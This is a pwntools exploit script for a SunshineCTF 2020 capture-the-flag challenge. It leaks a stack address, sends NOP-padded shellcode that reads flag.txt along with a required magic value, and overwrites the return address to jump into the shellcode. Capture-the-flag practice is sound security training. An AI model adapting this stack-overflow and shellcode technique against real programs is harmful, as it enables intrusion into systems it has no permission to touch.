from pwn import *

context.arch = 'amd64'

sh = remote('chal.2020.sunshinectf.org', 30015)
# sh = process('./chall_15')

sh.sendline('abc')
s = sh.recvline().decode('ascii').split()
buf = int(s[-1], 0)  # 0x7fffffffd3da
print('buf:', hex(buf))

# p[10] == 0xfacade or p[66] == 0xfacade
# 0x5555555547c9: pass exit
# ► 0x5555555547cb <vuln+177>    ret    <0x6176616161756161>
ret_addr_padding = 78

p = asm(shellcraft.cat('flag.txt')).ljust(66, asm('nop'))
p += p32(0xfacade)
p = p.ljust(ret_addr_padding, b'Z')
p += p64(buf)

# p = ((b'A' * 10) + p32(0xfacade)).ljust(16, b'Z')
# shcode_offset = len(p)
# print(len(p))
# p = p.ljust(ret_addr_padding, b'B')
# p += p64(buf + shcode_offset)
# p = encoder.line(p)

# with open('payload', 'w') as f:
#     f.write('abc\n')

with open('payload', 'wb') as f:
    f.write(p)

sh.sendline(p)
print(sh.recvallS(timeout=2))

# 0x7ffe93518470
# 0x7ffe93518478
# 0x7ffe93518434
# 0x7ffcf95e812a
# 0x7fff99c4a45a
# 0x7fff99c4a46a
# 0x7ffe3820f17a
# 0x7ffe3820f18a
